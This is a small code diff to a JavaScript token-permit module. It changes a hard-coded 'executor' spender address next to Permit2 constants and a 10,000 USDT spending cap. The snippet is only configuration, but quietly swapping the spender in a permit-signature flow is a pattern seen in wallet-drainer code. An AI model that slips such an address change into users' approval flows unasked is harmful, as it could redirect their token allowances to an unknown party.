@@ -14,7 +14,7 @@ const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 // Universal Router (common pitfall) — signatures should NOT set this as the spender
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 // Executor address is hard-coded per operator request
-const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
